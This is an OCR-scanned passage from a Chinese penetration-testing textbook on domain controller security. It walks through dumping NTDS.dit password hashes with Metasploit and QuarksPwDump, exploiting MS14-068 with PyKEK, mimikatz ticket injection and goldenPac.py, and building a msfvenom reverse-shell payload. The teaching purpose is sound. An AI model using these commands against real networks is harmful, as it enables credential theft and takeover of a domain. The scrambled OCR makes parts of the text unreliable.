Infornation
ter x64/windows
图6-41获取meterpreter会话
在Metasploit中输人“sessions”命令，可以查看当前的meterpreter会话。此时，有一个ID为
1的meterpreter会话，IP地址为192.168.100.220，机器名为DC——这台机器正是域控制器。
接下来，使用domain_hashdump模块获取域账号和域散列值。在Metasploit 中输入命令“use
windows/gather/credentials/domain_hashdump”。因为meterpreter会话的ID为1，所以此时应输人
“set session1”。然后，输人“exploit”命令并执行，如图6-42所示。
odule opt:ions (post/windows/gather/credent ials/domain_hashdurp):
Nare
Current Setting RequiredDescription
CLEANUP
locathost
SESSION
1SOH
yes
1
(s/gather/credentials/domain_hashdump) > explo1t
图6-42配合使用meterpreter会话导出全部的城散列值
---
## Page 314
第6章域控制器安全301
可以看到，ntds.dit被解析了，域账号和域散列值被导出了，如图6-43所示。
Operatien cospleted successfully in 1.419 seconds.
Built-1
1 10, 2018
Cont:21
16
图6-43导出城中的全部散列值
6.5
使用vshadow.exe和QuarksPwDump.exe导出
域账号和域散列值
在正常的域环境中，ntds.dit文件里包含大量的信息，体积较大，不方便保存到本地。如果域
控制器上没有安装杀毒软件，攻击者就能直接进人域控制器，导出ntds.dit并获得域账号和域散列
值，而不需要将ntds.dit保存到本地。
QuarksPwDump可以快速、安全、全面地读取全部域账号和域散列值，其源码可访问GitHub
下载，见[链接6-6]。
ShadowCopy是一款免费的增强型文件复制工具。ShadowCopy使用微软的卷影拷贝技术，能
够复制被锁定的文件及被其他程序打开的文件。
vshadow.exe 是从Windows SDK 中提取出来的。在本实验中，安装vshadow.exe后，会在
VSSSDK72\TestAppsivshadow目录下生成一个bin文件vshadow.exe（可以将该文件单独提取出来
使用）。将文件全部放人domainhash文件夹中，如图6-44所示。
pdp（））
o01
useuue
r Favortes
 Deskdop
la Oownloads
 shadowcopy.bet
3 QuerisPwDump.ese
Z Recent Place
 whadow.ce
图6-44实验所需工具
在shadowcopy.bat中设置工作目录为C:Windows\Temp\（目录可以在shadowcopy.bat 中自行
设置）
执行shadowcopy.bat脚本（该脚本使用vshadow.exe 生成快照），复制ntds.dit。然后，使用
---
## Page 315
302内网安全攻防：渗透测试实战指南
QuarksPwDump修复ntds.dit并导出域散列值。该脚本运行后，会在刚刚设置的工作目录下存放导
出的ntds.dit和hash.txt（包含域内所有的域账号及域散列值），如图6-45所示。
ow.odo
 Desitop
Ubrarie
3 QarsPw
.Musk
dad
copy.bet
图 6-45导出 ntds.dit 和 hash.txt
下载hash.txt并查看其内容，如图6-46所示。
YNEY
10A5A337E7
图6-46城内所有用户的数列值
本节列举了多种导出用户散列值的方法。在获得散列值后，可以使用本地工具或者在线工具
对其进行破解。如果采用本地破解的方式，可以使用Cain、LC7、Ophcrack（见【链接6-7]）
SAMInside、Hashcat等工具。如果采用在线破解的方式，针对NTLMHash的在线破解网站见[链
6.6Kerberos域用户提权漏洞分析与防范
微软在2014年11月18日发布了一个紧急补丁，修复了Kerberos域用户提权漏洞（MS14
068；CVE-2014-6324）。所有Windows服务器操作系统都会受该漏洞的影响，包括WindowsServer
2003、Windows Server 2008、 Windows Server 2008 R2、 Windows Server 2012 和 Windows Server
---
## Page 316
第6章域控制器安全303
2012R2。该漏润可导致活动目录整体权限控制受到影响，允许攻击者将域内任意用户权限提升至
域管理级别。通俗地讲，如果攻击者获取了域内任何一台计算机的Shell权限，同时知道任意域用
户的用户名、SID、密码，即可获得域管理员权限，进面控制域控制器，最终获得域权限。
这个漏洞产生的原因是：用户在向Kerberos密钥分发中心（KDC）申请TGT（由票据授权服
务产生的身份凭证）时，可以伪造自己的Kerberos票据。如果票据声明自已有域管理员权限，而
KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理
员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证TGT后，将服
务票据（ServiceTicket）发送给该用户，面该用户拥有访问该服务的权限，从面使攻击者可以访问
域内的资源
本节将在一个测试环境中对该漏洞进行分析，并给出相应的修复方案。
6.6.1测试环境
·域：pentestcom.
·域账号：user1/Aa123456@。
•域 SID:S-1-5-21-3112629480-1751665795-4053538595-1104。
·城控制器：WIN-2K5J2NT2O7P.pentest.com。
·Kali Linux 机器的 IP 地址：172.16.86.131。
·域机器的IP地址：172.16.86.129。
6.6.2PyKEK工具包
PyKEK（PythonKerberos ExploitationKit）是一个利用Kerberos 协议进行渗透测试的工具包，
下载地址见[链接6-15]，如图6-47所示。使用PyKEK可以生成一张高权限的服务票据，并通过
mimikatz将服务票据注入内存。
Kerberos Exploitation Kt
G11 commits
 1 brench
oreleses
 1 contibutor
anchmsterNew pef rest
Creete newleupladflesFindfleClone ordoload
 seord.
Latest cmit afaar8 on 5 Dec 2014
Be kek
encodigflx
4 yees ago
I pyesnt
ms14-068
4 yeers ago
E READMEmd
4 years ago
E) ms14-068.py
fix
4 yeesago
图 6-47PyKEK 下载页面
---
## Page 317
304内网安全攻防：渗透测试实战指南
PyKEK只需要系统中配置Python2.7环境就可以运行。使用PyKEK，可以将Python文件转
换为可执行文件（在没有配置Python环境的操作系统中也可以执行此操作）。
1.工具说明
ms14-068.py是PyKEK工具包中的MS14-068漏洞利用脚本，如图6-48所示。
0=Kali:-/桌面/M514-068/pykek#1s
kek ms14-068-pypyasn1README.nd
图 6-48 ms14-068.py
·-u@：用户名@域名。
·-s：用户 SID。
·-d：城控制器地址。
·-p：明文密码。
·--rc4：在没有明文密码的情况下，通过NTLM Hash登录。
2.查看域控制器的补丁安装情况
get hotfixid”，如图6-49所示，未发现该补丁。
C\Users\Adainistratorwmicqfe get hotfixid
2069169
tF 1xI0
图6-49查看域控制器的补丁安装情况
3.查看用户的SID
以用户userl的身份登录，输入命令“whoami/user"，可以看到该用户的SID为S-1-5-21-
3112629480-1751665795-4053538595-1104，如图 6-50 所示。
SER INFORMATION
rN.t
S1D
ntest nser1 S15213112629488-17516657954e535385951184
图6-50查看用户的SID
还有一个获取用户SID的方法。输入命令“wmicuseraccount get name,sid"，获取域内所有用
户的SID，如图6-51所示。
---
## Page 318
第6章域控制器安全305
adninistrator
Gneinistrator
2629488
11535385955
S1号213112629488-17516657954853538595-1104
5645
53
图6-51获取域内所有用户的SID
4.生成高权限票据
使用PyKEK生成高权限票据的命令，格式如下。
在pykek目录中输人如下命令。如图6-52所示，在当前目录下生成了一个名为“TGT_user1@
pentest.com.ccache”的票据文件。
python ms14-068.py -u PI:EMAIL -s S-1-5-21-3112629480-1751665795-
4053538595-1104 -d 172.16.86.130 -p Aa1234568
图6-52使用PyKEK生成高权限票据
5.查看注入前的权限
将票据文件复制到WindowsSever2008机器的mimikatz目录下，使用mimikatz将票据注人
内存。如图6-53所示，输人命令“netuse\WIN-2K5J2NT2O7PicS”，提示“Accessisdenied”，表
示在将票据注人前无法列出域控制器C盘目录的内容。
cer
1>Desktop×64>dir 0IN2K5J2NT207Pc
图6-53票据注入前无法列出城控制器C盘目录的内容
6.清除内存中的所有票据
打开mimikatz，输人命令“kerberos:purge”，清除内存中的票据信息。当看到“Ticket(s)purge
forcurrentsessionisOK”时，表示清除成功，如图6-54所示。
---
## Page 319
306内网安全攻防：渗透测试实战指南
ninte2x4it nApr9 27 23:24:28
len ian
uith 21 nodules *e*e)
Ticket(s)
图6-54清除内存中的票据
7.将高权限票据注入内存
在mimikatz中输人如下命令，“Injecting ticket：OK”表示注人成功，如图6-55所示。输人
“exit”命令，退出mimikatz。
kerberos::ptc "PI:EMAIL"
ninikatz # kerheross+ptc IGI wceeIPpente-t ,con,ccache
c ipal= 
M
图6-56验证权限
6.6.3goldenPac.py
goldenPac.py是一个用于对Kerberos进行测试的工具，它集成在impacket工具包中，存放在
impacket-master/examples 目录下。
goldenPac.py 的命令格式如下。
pythongoldenPac.py城名/城成员用户：城成员用户窖码g域控制器地址
1.安装Kerberos客户端
Kali中默认不包含Kerberos客户端，因此需要单独安装，命令如下。
2.配合使用PsExec获取域控制器的Shell
使用goldenPac.py获取域控制器的Shell，如图6-57所示。
1ng shares en [N2K
essft Cerparatien. Alt rights reserved.
Rincav51syites324
图6-57使用 goldenPac.py 获取域控制器的 Shell
goldenPac.py是通过PsExec获得Shell的，会产生大量的日志，加之PsExec已经被很多反病
毒厂商列为危险文件，所以，在日常网络维护中，我们很容易就能发现攻击者使用goldenPac.py实
现的恶意行为。
---
## Page 321
308内网安全攻防：渗透测试实战指南
6.6.4在Metasploit中进行测试
首先，打开Metasploit，找到MS14-068漏洞的利用脚本，执行如下命令，列出该脚本的所有
选项，如图6-58所示。
use auxi1iary/admin/kerberos/ms14_068_kerberos_checksum
Cerrent setting hepuirec Descrigtioe
OSS
yes
EEE
图6-58列出所有选项
·DOMAIN：域名。
·PASSWORD：被提权用户的密码。
·USER：被提权的用户。
·USER_SID：被提权用户的SID。
填写所有信息后，输人“exploit”命令，会在/root/.msf4/loot目录下生成文件20180715230259
default_172.16.86.130_windows.kerberos_839172.bin,如图 6-59 所示。
172.16.86.138:88
AS-REO
val14 105R
图6-59生成bin文件
接下来，进行格式转换。因为Metasploit不支持bin文件的导人，所以要先使用mimikatz对
文件进行格式转换。在mimikatz中输人如下命令，导出kirbi格式的文件，如图6-60所示。
kerberos::clist
"20180715230259_defau1t_172.16.86.130_windows.kerber0s_839172.bin* /export
在KaliLinux的命令行环境中输人如下命令，使用msfvenom生成一个反向 Shell，如图6-61
所示。
msfvenom -p vindows/meterpreter/reverse_tcp LH0ST=172.16.86.135 LPORT=4444 -f
exe > she11.exe
---